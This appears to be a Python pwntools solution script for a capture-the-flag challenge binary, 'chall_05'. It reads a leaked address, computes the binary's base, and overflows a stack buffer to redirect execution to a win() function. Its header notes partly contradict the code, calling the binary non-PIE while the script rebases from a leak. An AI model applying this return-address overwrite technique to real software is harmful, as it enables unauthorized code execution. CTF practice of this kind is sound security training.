'''
Flaws: no canary, symbols
Security: No PIE, NX enabled, Full RELRO

It contains symbol win() with its address
printf() leaks the address of main()
'''

from pwn import *

elf = ELF("./chall_05")
p = process("./chall_05")
l1 = b"Something"
p.sendline(l1)
p.recvuntil(b"greatest.\n")

#win = 0x5621ee20075a

p.recvuntil(b"win: ")
leak = p.recvuntil(b"\n")
print(leak)
leak_int = int(leak, 16)
print(hex(leak_int))


elf.address = leak_int - elf.sym.main

offset = 48
l2 = b"A" * (offset + 8) + p64(elf.sym.win)
p.sendline(l2)
p.interactive()
